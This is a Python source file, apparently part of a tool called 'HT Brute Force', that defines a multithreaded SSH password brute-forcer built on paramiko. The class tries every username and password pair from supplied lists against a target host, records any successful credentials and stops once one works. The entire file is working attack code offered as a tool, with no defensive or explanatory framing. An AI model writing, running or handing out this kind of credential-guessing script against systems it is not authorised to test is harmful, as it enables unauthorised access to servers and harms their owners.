"""HT Brute Force — SSH brute force via paramiko.
"""
import paramiko, socket, time
from threading import Thread, Event
from queue import Queue

class SSHBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or Event()
        self.results = []

    def _try_login(self, host, port, user, passwd):
        if self.stop_event.is_set():
            return None
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        t0 = time.time()
        try:
            client.connect(host, port=port, username=user, password=passwd,
                           timeout=self.timeout, banner_timeout=self.timeout,
                           auth_timeout=self.timeout, allow_agent=False,
                           look_for_keys=False)
            client.close()
            return {"user": user, "password": passwd, "time_s": round(time.time()-t0, 2)}
        except paramiko.AuthenticationException:
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}
        finally:
            try: client.close()
            except Exception: pass

    def run(self, host, port, users, passwords):
        q = Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))

        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(host, port, u, p)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()

        threads = [Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results